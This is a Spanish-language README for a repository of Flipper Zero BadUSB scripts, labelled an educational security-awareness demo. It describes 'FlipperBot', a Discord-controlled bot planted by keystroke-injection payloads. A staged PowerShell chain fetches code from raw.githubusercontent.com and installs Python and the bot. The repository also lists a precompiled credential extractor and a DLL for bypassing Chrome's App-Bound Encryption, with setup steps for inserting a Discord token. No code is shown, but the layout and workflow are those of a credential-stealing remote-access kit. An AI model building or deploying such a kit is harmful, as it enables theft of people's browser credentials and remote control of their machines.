# flipper_scripts

Scripts para Flipper Zero BadUSB - Demo educativa de concientizacion en seguridad.

## FlipperBot

Bot de Discord controlado via BadUSB para demostraciones de Red Team.

### Estructura

```
flipperbot/
├── payloads/                    # DuckyScript para el Flipper Zero
│   ├── FlipperBot-Payload-enUS.txt    # Teclado en-US
│   ├── FlipperBot-Payload-esLA.txt    # Teclado es-LA
│   └── FlipperBot-Payload-RunDialog.txt  # Via Win+R (en-US)
├── f44b1874d8cce12b_run.ps1     # Stage 1: token + channel, llama a setup
├── f44b1874d8cce12b_setup.ps1   # Stage 2: instala Python, deps, lanza bot
├── f44b1874d8cce12b_bot.py      # Bot de Discord
├── creds_extractor.exe          # Extractor de credenciales (pre-compilado)
├── abe_decrypt.dll              # DLL para bypass ABE (Chrome 127+)
└── creds_extractor/             # Fuente Rust del extractor
    ├── Cargo.toml
    └── src/main.rs
```

### Configuracion

1. Edita `f44b1874d8cce12b_run.ps1` con tu bot token y channel ID de Discord
2. Haz push al repo
3. Copia el payload correspondiente a tu Flipper Zero (`badusb/`)

### Uso

El payload BadUSB ejecuta PowerShell que descarga los scripts desde este repo via `raw.githubusercontent.com`.
